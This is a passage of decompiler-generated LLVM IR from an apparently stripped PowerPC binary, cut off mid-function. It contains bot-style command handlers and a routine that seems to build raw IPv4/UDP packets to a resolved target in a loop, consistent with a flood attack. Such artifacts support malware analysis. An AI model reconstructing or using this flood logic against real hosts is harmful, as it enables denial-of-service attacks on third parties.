dec_label_pc_100017e4:                            ; preds = %dec_label_pc_100017a4, %dec_label_pc_10001768, %dec_label_pc_100017c0
  %v0_100017f8 = phi i32 [ %v5_100017b8, %dec_label_pc_100017a4 ], [ %v5_1000177c, %dec_label_pc_10001768 ], [ %v5_100017e0, %dec_label_pc_100017c0 ]
  ret i32 %v0_100017f8

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100017e4, { 2, 0, 1 }
}

define i32 @function_100017fc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_100017fc:
  %v3_10001824 = icmp eq i32 %arg3, 1
  br i1 %v3_10001824, label %dec_label_pc_10001894, label %dec_label_pc_1000182c

dec_label_pc_1000182c:                            ; preds = %dec_label_pc_100017fc
  %v5_10001840 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_1000d6d4.53 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_10001848 = load i8, i8* @global_var_1001045c.9, align 1
  %v3_10001850 = icmp eq i8 %v3_10001848, 0
  %. = select i1 %v3_10001850, i32 ptrtoint ([28 x i8]* @global_var_1000d6fc.55 to i32), i32 ptrtoint ([9 x i8]* @global_var_1000d6f0.54 to i32)
  %v7_1000188c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_1000d718.56 to i32), i32 %arg2, i32 %.)
  br label %dec_label_pc_10001958

dec_label_pc_10001894:                            ; preds = %dec_label_pc_100017fc
  %v3_10001898 = load i8, i8* @global_var_1001045c.9, align 1
  %v3_100018a0 = icmp eq i8 %v3_10001898, 0
  br i1 %v3_100018a0, label %dec_label_pc_100018c4, label %dec_label_pc_100018a8

dec_label_pc_100018a8:                            ; preds = %dec_label_pc_10001894
  %v5_100018bc = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1000d73c.58 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10001958

dec_label_pc_100018c4:                            ; preds = %dec_label_pc_10001894
  %v1_100018c8 = add i32 %arg4, 4
  %v1_100018cc = inttoptr i32 %v1_100018c8 to i32*
  %v2_100018cc = load i32, i32* %v1_100018cc, align 4
  store i32 %v2_100018cc, i32* @r3, align 4
  %v0_100018d4 = call i32 @function_10007284()
  %tmp13 = icmp ult i32 %v0_100018d4, 255
  br i1 %tmp13, label %dec_label_pc_10001900, label %dec_label_pc_100018e4

dec_label_pc_100018e4:                            ; preds = %dec_label_pc_100018c4
  %v5_100018f8 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_1000d75c.60 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10001958

dec_label_pc_10001900:                            ; preds = %dec_label_pc_100018c4
  store i8 1, i8* @global_var_1001045c.9, align 1
  store i32 268441896, i32* @lr, align 4
  %v3_10001924 = call i32 @function_100071a0(i32 ptrtoint (i32* @global_var_10012b24.62 to i32), i32 0, i32 256)
  %v2_10001930 = load i32, i32* %v1_100018cc, align 4
  %v2_10001940 = inttoptr i32 %v2_10001930 to i8*
  %v3_10001940 = call i32 @function_10007264(i32 ptrtoint (i32* @global_var_10012b24.62 to i32), i8* %v2_10001940)
  %v5_10001954 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_1000d784.63 to i32), i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 %arg4)
  br label %dec_label_pc_10001958

dec_label_pc_10001958:                            ; preds = %dec_label_pc_100018e4, %dec_label_pc_100018a8, %dec_label_pc_1000182c, %dec_label_pc_10001900
  %v0_1000196c = phi i32 [ %v5_100018f8, %dec_label_pc_100018e4 ], [ %v5_100018bc, %dec_label_pc_100018a8 ], [ %v7_1000188c, %dec_label_pc_1000182c ], [ %v5_10001954, %dec_label_pc_10001900 ]
  ret i32 %v0_1000196c

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32 %arg1, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10001958, { 3, 0, 1, 2 }
}

define i32 @function_10001970(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10001970:
  %v3_10001998 = icmp eq i32 %arg3, 1
  br i1 %v3_10001998, label %dec_label_pc_10001a08, label %dec_label_pc_100019a0

dec_label_pc_100019a0:                            ; preds = %dec_label_pc_10001970
  %v5_100019b4 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_1000d7a4.64 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_100019bc = load i8, i8* @global_var_1001045c.9, align 1
  %v3_100019c4 = icmp eq i8 %v3_100019bc, 0
  %. = select i1 %v3_100019c4, i32 ptrtoint ([28 x i8]* @global_var_1000d6fc.55 to i32), i32 ptrtoint ([9 x i8]* @global_var_1000d6f0.54 to i32)
  %v7_10001a00 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_1000d718.56 to i32), i32 %arg2, i32 %.)
  br label %dec_label_pc_10001aa0

dec_label_pc_10001a08:                            ; preds = %dec_label_pc_10001970
  %v3_10001a0c = load i8, i8* @global_var_1001045c.9, align 1
  %v3_10001a14 = icmp eq i8 %v3_10001a0c, 0
  br i1 %v3_10001a14, label %dec_label_pc_10001a1c, label %dec_label_pc_10001a38

dec_label_pc_10001a1c:                            ; preds = %dec_label_pc_10001a08
  %v5_10001a30 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_1000d7c0.66 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10001aa0

dec_label_pc_10001a38:                            ; preds = %dec_label_pc_10001a08
  %v1_10001a3c = add i32 %arg4, 4
  %v1_10001a40 = inttoptr i32 %v1_10001a3c to i32*
  %v2_10001a40 = load i32, i32* %v1_10001a40, align 4
  store i32 ptrtoint (i32* @global_var_10012b24.62 to i32), i32* @r3, align 4
  store i32 %v2_10001a40, i32* @r4, align 4
  %v2_10001a50 = call i32 @function_1000770c(i32 ptrtoint (i32* @global_var_10012b24.62 to i32), i32 %v2_10001a40)
  %v3_10001a58 = icmp eq i32 %v2_10001a50, 0
  br i1 %v3_10001a58, label %dec_label_pc_10001a7c, label %dec_label_pc_10001a60

dec_label_pc_10001a60:                            ; preds = %dec_label_pc_10001a38
  %v5_10001a74 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_1000d7e0.68 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10001aa0

dec_label_pc_10001a7c:                            ; preds = %dec_label_pc_10001a38
  store i8 0, i8* @global_var_1001045c.9, align 1
  %v5_10001a9c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1000d7fc.70 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10001aa0

dec_label_pc_10001aa0:                            ; preds = %dec_label_pc_10001a60, %dec_label_pc_10001a1c, %dec_label_pc_100019a0, %dec_label_pc_10001a7c
  %v0_10001ab4 = phi i32 [ %v5_10001a74, %dec_label_pc_10001a60 ], [ %v5_10001a30, %dec_label_pc_10001a1c ], [ %v7_10001a00, %dec_label_pc_100019a0 ], [ %v5_10001a9c, %dec_label_pc_10001a7c ]
  ret i32 %v0_10001ab4

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_10012b24.62 to i32), { 0, 3, 2, 1 }
  uselistorder i8* @global_var_1001045c.9, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 4, 0, 1 }
  uselistorder i32 %arg1, { 3, 2, 4, 0, 1 }
  uselistorder label %dec_label_pc_10001aa0, { 3, 0, 1, 2 }
}

define i32 @function_10001ab8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10001ab8:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-312 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %stack_var_-320 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10001ab8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10001ab8, i32* %stack_var_-320, align 4
  %v3_10001ae4 = icmp eq i32 %arg3, 1
  br i1 %v3_10001ae4, label %dec_label_pc_10001b20, label %dec_label_pc_10001aec

dec_label_pc_10001aec:                            ; preds = %dec_label_pc_10001ab8
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v5_10001b00 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_1000d81c.71 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  store i8* null, i8** @global_var_10010460.15, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_10010464.16, align 4
  br label %dec_label_pc_10001ce8

dec_label_pc_10001b20:                            ; preds = %dec_label_pc_10001ab8
  %v1_10001b24 = add i32 %arg4, 4
  store i32 %v1_10001b24, i32* %r9.global-to-local, align 4
  %v1_10001b28 = inttoptr i32 %v1_10001b24 to i32*
  %v2_10001b28 = load i32, i32* %v1_10001b28, align 4
  store i32 %v2_10001b28, i32* @r3, align 4
  %v0_10001b30 = call i32 @function_10007284()
  %tmp30 = icmp ult i32 %v0_10001b30, 17
  br i1 %tmp30, label %dec_label_pc_10001b5c, label %dec_label_pc_10001b40

dec_label_pc_10001b40:                            ; preds = %dec_label_pc_10001b20
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v5_10001b54 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_1000d83c.72 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10001ce8

dec_label_pc_10001b5c:                            ; preds = %dec_label_pc_10001b20
  store i32 %v1_10001b24, i32* %r9.global-to-local, align 4
  %v2_10001b64 = load i32, i32* %v1_10001b28, align 4
  store i32 %v2_10001b64, i32* %r9.global-to-local, align 4
  %v2_10001b68 = ptrtoint i32* %stack_var_-300 to i32
  %v2_10001b74 = inttoptr i32 %v2_10001b64 to i8*
  %v3_10001b74 = call i32 @function_10007264(i32 %v2_10001b68, i8* %v2_10001b74)
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001b80 = call i32 @function_10007284()
  %v2_10001b8c = ptrtoint i32* %stack_var_-312 to i32
  %v1_10001b88 = add i32 %v2_10001b8c, -1
  %v2_10001b90 = add i32 %v1_10001b88, %v0_10001b80
  store i32 %v2_10001b90, i32* %r9.global-to-local, align 4
  %v1_10001b94 = add i32 %v2_10001b90, 12
  %v2_10001b94 = inttoptr i32 %v1_10001b94 to i8*
  %v3_10001b94 = load i8, i8* %v2_10001b94, align 1
  %v3_10001b9c = icmp eq i8 %v3_10001b94, 46
  br i1 %v3_10001b9c, label %dec_label_pc_10001ba4, label %dec_label_pc_10001c10.preheader

dec_label_pc_10001ba4:                            ; preds = %dec_label_pc_10001b5c
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001bac = call i32 @function_10007284()
  %v2_10001bbc = add i32 %v1_10001b88, %v0_10001bac
  store i32 %v2_10001bbc, i32* %r9.global-to-local, align 4
  %v3_10001bc4 = add i32 %v2_10001bbc, 12
  %v4_10001bc4 = inttoptr i32 %v3_10001bc4 to i8*
  store i8 0, i8* %v4_10001bc4, align 1
  br label %dec_label_pc_10001c10.preheader

dec_label_pc_10001c10.preheader:                  ; preds = %dec_label_pc_10001b5c, %dec_label_pc_10001ba4
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001c1c8 = call i32 @function_10007284()
  %v2_10001c2410 = icmp eq i32 %v0_10001c1c8, 0
  br i1 %v2_10001c2410, label %dec_label_pc_10001c2c, label %dec_label_pc_10001bdc

dec_label_pc_10001bdc:                            ; preds = %dec_label_pc_10001c10.preheader, %dec_label_pc_10001c04
  %stack_var_-304.014 = phi i32 [ %v1_10001c08, %dec_label_pc_10001c04 ], [ 0, %dec_label_pc_10001c10.preheader ]
  %stack_var_-308.113 = phi i32 [ %stack_var_-308.0, %dec_label_pc_10001c04 ], [ 1, %dec_label_pc_10001c10.preheader ]
  %v2_10001be4 = add i32 %stack_var_-304.014, %v2_10001b8c
  store i32 %v2_10001be4, i32* %r9.global-to-local, align 4
  %v1_10001be8 = add i32 %v2_10001be4, 12
  %v2_10001be8 = inttoptr i32 %v1_10001be8 to i8*
  %v3_10001be8 = load i8, i8* %v2_10001be8, align 1
  %v3_10001bf0 = icmp eq i8 %v3_10001be8, 46
  br i1 %v3_10001bf0, label %dec_label_pc_10001bf8, label %dec_label_pc_10001c04

dec_label_pc_10001bf8:                            ; preds = %dec_label_pc_10001bdc
  store i32 %stack_var_-308.113, i32* %r9.global-to-local, align 4
  %v1_10001bfc = add i32 %stack_var_-308.113, 1
  br label %dec_label_pc_10001c04

dec_label_pc_10001c04:                            ; preds = %dec_label_pc_10001bdc, %dec_label_pc_10001bf8
  %stack_var_-308.0 = phi i32 [ %v1_10001bfc, %dec_label_pc_10001bf8 ], [ %stack_var_-308.113, %dec_label_pc_10001bdc ]
  store i32 %stack_var_-304.014, i32* %r9.global-to-local, align 4
  %v1_10001c08 = add i32 %stack_var_-304.014, 1
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001c1c = call i32 @function_10007284()
  %v2_10001c24 = icmp ult i32 %v1_10001c08, %v0_10001c1c
  br i1 %v2_10001c24, label %dec_label_pc_10001bdc, label %dec_label_pc_10001c2c

dec_label_pc_10001c2c:                            ; preds = %dec_label_pc_10001c10.preheader, %dec_label_pc_10001c04
  %stack_var_-308.1.lcssa = phi i32 [ 1, %dec_label_pc_10001c10.preheader ], [ %stack_var_-308.0, %dec_label_pc_10001c04 ]
  %v1_10001c30 = sub i32 4, %stack_var_-308.1.lcssa
  store i32 %v1_10001c30, i32* %r9.global-to-local, align 4
  %v2_10001c8c4 = icmp sgt i32 %v1_10001c30, 0
  %v4_10001c8c6 = icmp eq i32 %v1_10001c30, 0
  br i1 %v2_10001c8c4, label %dec_label_pc_10001c44, label %dec_label_pc_10001c94

dec_label_pc_10001c44:                            ; preds = %dec_label_pc_10001c2c, %dec_label_pc_10001c44
  %storemerge27 = phi i32 [ %v1_10001c7c, %dec_label_pc_10001c44 ], [ 0, %dec_label_pc_10001c2c ]
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001c50 = call i32 @function_10007284()
  %v2_10001c58 = add i32 %v2_10001b68, %v0_10001c50
  store i32 %v2_10001c58, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v3_10001c70 = inttoptr i32 %v2_10001c58 to i16*
  store i16 11824, i16* %v3_10001c70, align 2
  %v0_10001c74 = load i32, i32* %r9.global-to-local, align 4
  %v1_10001c74 = trunc i32 %v0_10001c74 to i8
  %v2_10001c74 = load i32, i32* %r11.global-to-local, align 4
  %v3_10001c74 = add i32 %v2_10001c74, 2
  %v4_10001c74 = inttoptr i32 %v3_10001c74 to i8*
  store i8 %v1_10001c74, i8* %v4_10001c74, align 1
  %v1_10001c7c = add nuw nsw i32 %storemerge27, 1
  store i32 %v1_10001c30, i32* %r9.global-to-local, align 4
  %v2_10001c8c = icmp slt i32 %v1_10001c7c, %v1_10001c30
  br i1 %v2_10001c8c, label %dec_label_pc_10001c44, label %dec_label_pc_10001c94

dec_label_pc_10001c94:                            ; preds = %dec_label_pc_10001c44, %dec_label_pc_10001c2c
  store i32 %v2_10001b68, i32* @r3, align 4
  %v2_10001c9c = call i32 @function_100079f4(i32 %v2_10001b68, i32 %v1_10001c30)
  store i32 %v2_10001c9c, i32* %stack_var_-312, align 4
  br i1 %v4_10001c8c6, label %dec_label_pc_10001cb4, label %dec_label_pc_10001cc4

dec_label_pc_10001cb4:                            ; preds = %dec_label_pc_10001c94
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10001cdc

dec_label_pc_10001cc4:                            ; preds = %dec_label_pc_10001c94
  %v2_10001ccc = call i32 @function_10000d98(i32 256, i32 %v1_10001c30)
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_10001ce0.pre = load i32, i32* %stack_var_-312, align 4
  br label %dec_label_pc_10001cdc

dec_label_pc_10001cdc:                            ; preds = %dec_label_pc_10001cb4, %dec_label_pc_10001cc4
  %v0_10001d0017 = phi i32 [ %v2_10001c9c, %dec_label_pc_10001cb4 ], [ %v2_10001ccc, %dec_label_pc_10001cc4 ]
  %v3_10001ce0 = phi i32 [ %v2_10001c9c, %dec_label_pc_10001cb4 ], [ %v3_10001ce0.pre, %dec_label_pc_10001cc4 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_10001cb4 ], [ %v2_10001ccc, %dec_label_pc_10001cc4 ]
  store i32 %storemerge, i32* @global_var_10010464.16, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v4_10001ce4 = inttoptr i32 %v3_10001ce0 to i8*
  store i8* %v4_10001ce4, i8** @global_var_10010460.15, align 4
  br label %dec_label_pc_10001ce8

dec_label_pc_10001ce8:                            ; preds = %dec_label_pc_10001b40, %dec_label_pc_10001aec, %dec_label_pc_10001cdc
  %v0_10001d00 = phi i32 [ %v5_10001b54, %dec_label_pc_10001b40 ], [ %v5_10001b00, %dec_label_pc_10001aec ], [ %v0_10001d0017, %dec_label_pc_10001cdc ]
  %v2_10001ce8 = load i32, i32* %stack_var_-320, align 4
  store i32 %v2_10001ce8, i32* %r11.global-to-local, align 4
  ret i32 %v0_10001d00

; uselistorder directives
  uselistorder i32 %v2_10001ccc, { 1, 0 }
  uselistorder i32 %v2_10001c9c, { 1, 0, 2 }
  uselistorder i32 %v1_10001c7c, { 1, 0 }
  uselistorder i32 %v1_10001c30, { 3, 6, 5, 4, 0, 1, 2 }
  uselistorder i32 %stack_var_-308.113, { 2, 0, 1 }
  uselistorder i32 %stack_var_-304.014, { 1, 2, 0 }
  uselistorder i32 %v2_10001b68, { 3, 2, 0, 4, 5, 1, 6, 7, 8 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 6, 4, 5, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 (i32, i32)* @function_10000d98, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10001ce8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10001cdc, { 1, 0 }
  uselistorder label %dec_label_pc_10001c44, { 1, 0 }
  uselistorder label %dec_label_pc_10001c2c, { 1, 0 }
  uselistorder label %dec_label_pc_10001c04, { 1, 0 }
  uselistorder label %dec_label_pc_10001bdc, { 1, 0 }
  uselistorder label %dec_label_pc_10001c10.preheader, { 1, 0 }
}

define i32 @function_10001d04(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10001d04:
  store i32 268442920, i32* @lr, align 4
  %v1_10001d24 = call i32 @function_10007b1c(i32 %arg2)
  store i32 %v1_10001d24, i32* @global_var_1001046c.76, align 4
  %v4_10001d40 = icmp eq i32 %v1_10001d24, -1
  br i1 %v4_10001d40, label %dec_label_pc_10001d48, label %dec_label_pc_10001dbc

dec_label_pc_10001d48:                            ; preds = %dec_label_pc_10001d04
  store i32 268442960, i32* @lr, align 4
  %v2_10001d4c = call i32 @function_10007b50(i32 %arg2, i32 -1)
  %v3_10001d5c = icmp eq i32 %v2_10001d4c, 0
  br i1 %v3_10001d5c, label %dec_label_pc_10001d64, label %dec_label_pc_10001d90

dec_label_pc_10001d64:                            ; preds = %dec_label_pc_10001d48
  %v3_10001d68 = load i32, i32* @global_var_10010478.10, align 4
  %v6_10001d84 = call i32 @function_1000041c(i32 %v3_10001d68, i32 ptrtoint ([33 x i8]* @global_var_1000d88c.77 to i32), i32 %arg1, i32 %arg2)
  %v0_10001d8c = call i32 @function_10008dd4()
  br label %dec_label_pc_10001d90

dec_label_pc_10001d90:                            ; preds = %dec_label_pc_10001d48, %dec_label_pc_10001d64
  %v1_10001d94 = add i32 %v2_10001d4c, 16
  %v2_10001d94 = inttoptr i32 %v1_10001d94 to i32*
  %v3_10001d94 = load i32, i32* %v2_10001d94, align 4
  %v1_10001d98 = inttoptr i32 %v3_10001d94 to i32*
  %v2_10001d98 = load i32, i32* %v1_10001d98, align 4
  %v1_10001da8 = add i32 %v2_10001d4c, 12
  %v2_10001da8 = inttoptr i32 %v1_10001da8 to i32*
  %v3_10001da8 = load i32, i32* %v2_10001da8, align 4
  store i32 %v3_10001da8, i32* @r5, align 4
  store i32 268443068, i32* @lr, align 4
  %v4_10001db8 = call i32 @function_100076fc(i32 %v2_10001d98, i32 ptrtoint (i32* @global_var_1001046c.76 to i32), i32 %v3_10001da8, i32 %v2_10001d4c)
  %v3_10001dc0.pre = load i32, i32* @global_var_1001046c.76, align 4
  br label %dec_label_pc_10001dbc

dec_label_pc_10001dbc:                            ; preds = %dec_label_pc_10001d04, %dec_label_pc_10001d90
  %v3_10001dc0 = phi i32 [ %v1_10001d24, %dec_label_pc_10001d04 ], [ %v3_10001dc0.pre, %dec_label_pc_10001d90 ]
  ret i32 %v3_10001dc0

; uselistorder directives
  uselistorder i32 %v3_10001da8, { 1, 0 }
  uselistorder i32 %v2_10001d4c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10001dbc, { 1, 0 }
  uselistorder label %dec_label_pc_10001d90, { 1, 0 }
}

define i32 @function_10001de0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10001de0:
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1552 = alloca i32, align 4
  %stack_var_-1508 = alloca i32, align 4
  %stack_var_-1516 = alloca i32, align 4
  %stack_var_-1536 = alloca i32, align 4
  store i32 268443156, i32* @lr, align 4
  %v1_10001e10 = call i32 @function_10004d80(i32 0)
  %v1_10001e20 = call i32 @function_100004f0(i32 %arg2)
  %v3_10001e28 = icmp eq i32 %v1_10001e20, 0
  br i1 %v3_10001e28, label %dec_label_pc_10001e30, label %dec_label_pc_10002108

dec_label_pc_10001e30:                            ; preds = %dec_label_pc_10001de0
  store i32 268443200, i32* @lr, align 4
  %v3_10001e3c = call i32 @function_10008068(i32 2, i32 3, i32 255)
  %tmp32 = icmp sgt i32 %v3_10001e3c, -1
  br i1 %tmp32, label %dec_label_pc_10001e5c, label %dec_label_pc_10001e54

dec_label_pc_10001e54:                            ; preds = %dec_label_pc_10001e30
  %v0_10001e58 = call i32 @function_10008dd4()
  br label %dec_label_pc_10001e5c

dec_label_pc_10001e5c:                            ; preds = %dec_label_pc_10001e30, %dec_label_pc_10001e54
  %v2_10001e60 = icmp sgt i32 %arg3, 2
  br i1 %v2_10001e60, label %dec_label_pc_10001e88, label %dec_label_pc_10001e68

dec_label_pc_10001e68:                            ; preds = %dec_label_pc_10001e5c
  %v5_10001e7c = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1000d8b0.79 to i32), i32 %arg2, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_10001e84 = call i32 @function_10008dd4()
  br label %dec_label_pc_10001e88

dec_label_pc_10001e88:                            ; preds = %dec_label_pc_10001e5c, %dec_label_pc_10001e68
  %v1_10001e8c = add i32 %arg4, 4
  %v1_10001e90 = inttoptr i32 %v1_10001e8c to i32*
  %v2_10001e90 = load i32, i32* %v1_10001e90, align 4
  store i32 268443296, i32* @lr, align 4
  %v3_10001e9c = call i32 @function_10001d04(i32 %arg2, i32 %v2_10001e90, i32 %v1_10001e8c)
  %v1_10001eac = add i32 %arg4, 8
  %v1_10001eb0 = inttoptr i32 %v1_10001eac to i32*
  %v2_10001eb0 = load i32, i32* %v1_10001eb0, align 4
  store i32 268443324, i32* @lr, align 4
  %v2_10001eb8 = inttoptr i32 %v2_10001eb0 to i8*
  %v3_10001eb8 = call i32 @function_10008c0c(i8* %v2_10001eb8, i32 %v1_10001eac)
  %v1_10001ec8 = add i32 %arg4, 12
  %v1_10001ecc = inttoptr i32 %v1_10001ec8 to i32*
  %v2_10001ecc = load i32, i32* %v1_10001ecc, align 4
  store i32 268443352, i32* @lr, align 4
  %v2_10001ed4 = inttoptr i32 %v2_10001ecc to i8*
  %v3_10001ed4 = call i32 @function_10008c0c(i8* %v2_10001ed4, i32 %v1_10001ec8)
  %v2_10001ee0 = ptrtoint i32* %stack_var_-1536 to i32
  %v2_10001eec = ptrtoint i32* %stack_var_-1516 to i32
  %tmp33 = bitcast i32* %stack_var_-1516 to i16*
  %v2_10001ef8 = ptrtoint i32* %stack_var_-1508 to i32
  store i32 268443408, i32* @lr, align 4
  %v3_10001f0c = call i32 @function_100071a0(i32 %v2_10001ef8, i32 10, i32 1472)
  %v2_10001f18 = load i32, i32* %v1_10001e90, align 4
  %v6_10001f34 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_1000d8d8.81 to i32), i32 %arg2, i32 %v2_10001f18)
  %v1_10001f44 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  store i32 %v1_10001f44, i32* %stack_var_-1536, align 4
  %v1_10001f58 = call i32 @__asm_rlwimi(i32 4, i32 24, i32 4, i32 7)
  store i32 %v1_10001f58, i32* %stack_var_-1536, align 4
  %v3_10001f68 = or i32 %v2_10001ee0, 1
  %v4_10001f68 = inttoptr i32 %v3_10001f68 to i8*
  store i8 0, i8* %v4_10001f68, align 1
  %v3_10001f74 = or i32 %v2_10001ee0, 2
  %v4_10001f74 = inttoptr i32 %v3_10001f74 to i16*
  store i16 1500, i16* %v4_10001f74, align 2
  %v3_10001f80 = add i32 %v2_10001ee0, 6
  %v4_10001f80 = inttoptr i32 %v3_10001f80 to i16*
  store i16 0, i16* %v4_10001f80, align 2
  %v3_10001f8c = add i32 %v2_10001ee0, 9
  %v4_10001f8c = inttoptr i32 %v3_10001f8c to i8*
  store i8 17, i8* %v4_10001f8c, align 1
  %v3_10001f98 = add i32 %v2_10001ee0, 8
  %v4_10001f98 = inttoptr i32 %v3_10001f98 to i8*
  store i8 64, i8* %v4_10001f98, align 4
  %v2_10001fa4 = add i32 %v2_10001ee0, 16
  %v3_10001fa4 = inttoptr i32 %v2_10001fa4 to i32*
  store i32 %v3_10001e9c, i32* %v3_10001fa4, align 4
  %v1_10001fac = urem i32 %tmp10, 65536
  store i32 %v1_10001fac, i32* @r3, align 4
  %v1_10001fb4 = call i32 @function_100079f0(i32 %v1_10001fac)
  %v1_10001fc0 = trunc i32 %v1_10001fb4 to i16
  %v3_10001fc0 = add i32 %v2_10001eec, 4
  %v4_10001fc0 = inttoptr i32 %v3_10001fc0 to i16*
  store i16 %v1_10001fc0, i16* %v4_10001fc0, align 4
  store i32 2, i32* %stack_var_-1552, align 4
  %v3_10001fec = icmp eq i32 %v3_10001eb8, 0
  %v3_10002024 = or i32 %v2_10001eec, 2
  %v4_10002024 = inttoptr i32 %v3_10002024 to i16*
  %v2_10002034 = bitcast i32* %stack_var_-1536 to i16*
  %v3_10002040 = add i32 %v2_10001eec, 6
  %v4_10002040 = inttoptr i32 %v3_10002040 to i16*
  %v2_10002050 = add i32 %v2_10001ee0, 12
  %v3_10002050 = inttoptr i32 %v2_10002050 to i32*
  %v3_10002064 = add i32 %v2_10001ee0, 4
  %v4_10002064 = inttoptr i32 %v3_10002064 to i16*
  %v3_10002080 = add i32 %v2_10001ee0, 10
  %v4_10002080 = inttoptr i32 %v3_10002080 to i16*
  %v2_10002094 = ptrtoint i32* %stack_var_-1552 to i32
  %v2_100020dc = add i32 %v3_10001ed4, %v1_10001e10
  %v1_10001ff8 = urem i32 %v3_10001eb8, 65536
  br label %dec_label_pc_10001fd4

dec_label_pc_10001fd4:                            ; preds = %dec_label_pc_100020f8, %dec_label_pc_10001e88
  %stack_var_-1560.0 = phi i32 [ 0, %dec_label_pc_10001e88 ], [ %v1_100020fc, %dec_label_pc_100020f8 ]
  store i32 268443608, i32* @lr, align 4
  %v0_10001fd4 = call i32 @function_100086d4()
  %v1_10001fe4 = trunc i32 %v0_10001fd4 to i16
  store i16 %v1_10001fe4, i16* %tmp33, align 4
  br i1 %v3_10001fec, label %dec_label_pc_10002014, label %dec_label_pc_10001ff4

dec_label_pc_10001ff4:                            ; preds = %dec_label_pc_10001fd4
  store i32 %v1_10001ff8, i32* @r3, align 4
  %v1_10002000 = call i32 @function_100079f0(i32 %v1_10001ff8)
  %extract.t = trunc i32 %v1_10002000 to i16
  br label %dec_label_pc_10002028

dec_label_pc_10002014:                            ; preds = %dec_label_pc_10001fd4
  store i32 268443672, i32* @lr, align 4
  %v0_10002014 = call i32 @function_100086d4()
  %extract.t41 = trunc i32 %v0_10002014 to i16
  br label %dec_label_pc_10002028

dec_label_pc_10002028:                            ; preds = %dec_label_pc_10001ff4, %dec_label_pc_10002014
